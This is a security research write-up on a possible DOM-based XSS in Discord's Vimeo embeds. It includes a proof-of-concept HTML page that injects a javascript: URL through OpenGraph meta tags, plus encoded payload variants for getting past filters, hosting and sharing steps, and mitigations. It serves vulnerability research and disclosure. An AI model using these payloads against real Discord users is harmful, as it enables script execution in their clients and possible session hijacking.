# Discord Vimeo Embed DOM XSS Research

## Overview
This document details research into potential DOM-based XSS vulnerabilities in Discord's Vimeo video embedding functionality. The research focuses on exploiting the interaction between Discord's embed parser and Vimeo's player URL parameters.

## Vulnerability Hypothesis
Discord processes OpenGraph meta tags when embedding Vimeo content. The `og:video:url` meta tag potentially allows for JavaScript injection through Vimeo's URL parameters, specifically the `success` parameter in private video URLs.

## Technical Details

### Target URL Structure
```
https://player.vimeo.com/video/[VIDEO_ID]/login/private?success=[PAYLOAD]
```

### Relevant Code Patterns
Discord's URL validation for Vimeo appears to check the hostname:
```javascript
function checkValidURL(url) {
    let parsed = new URL(url);
    if (parsed.hostname == "vimeo.com") {
        return true;
    }
}
```

### Attack Vector
1. The exploit attempts to bypass URL validation by maintaining the legitimate Vimeo domain
2. Injection point is in the `success` parameter of private video URLs
3. Uses OpenGraph meta tags to control how Discord processes the embed

### Proof of Concept
```html
<!DOCTYPE html>
<html>
<head>
    <meta property="og:site_name" content="Vimeo">
    <meta property="og:type" content="video.other">
    <meta property="og:image" content="https://i.vimeocdn.com/video/test/maxresdefault.jpg">
    <meta property="og:video:url" content="https://player.vimeo.com/video/123456789/login/private?success=xburl=javascript:alert(document.domain)">
    <meta property="og:video:type" content="text/html">
    <meta property="og:video:width" content="1280">
    <meta property="og:video:height" content="720">
</head>
</html>
```

## Testing Methodology

1. **Setup**
   - Host the PoC HTML file on a public server
   - Ensure the server sends correct content-type headers

2. **Test Cases**
   a. Basic XSS Payload:
   ```
   success=javascript:alert(document.domain)
   ```
   
   b. URL-encoded Payload:
   ```
   success=javascript%3Aalert(document.domain)
   ```
   
   c. Double-encoded Payload:
   ```
   success=javascript%253Aalert(document.domain)
   ```

3. **Verification Steps**
   - Share the URL in Discord
   - Monitor if the embed renders
   - Check if JavaScript executes
   - Observe network requests
   - Document any error messages

## Potential Impact
If successful, this vulnerability could allow:
- Execution of arbitrary JavaScript in Discord client
- Access to Discord's client-side API
- Potential access to user data
- Session hijacking

## Mitigation Suggestions
1. Implement strict URL parameter validation
2. Sanitize success callback parameters
3. Use Content Security Policy headers
4. Implement URL parameter allowlist
5. Validate video IDs against Vimeo's API

## Additional Notes
- Discord's embed system processes OpenGraph meta tags
- Vimeo's player accepts various URL parameters
- The success parameter is typically used for redirect URLs
- Multiple encoding layers may bypass filters

## Test Environment
- Discord Client Version: Latest
- Browser: Chrome/Firefox latest
- Test URL: https://ctf.jxint.vercel.app/discord/discord_bug.html

## References
1. Discord Embed Documentation
2. Vimeo Player SDK Documentation
3. OpenGraph Protocol Specification
4. Common DOM XSS Patterns

---
Research Date: 2024-12-15
Status: Under Investigation
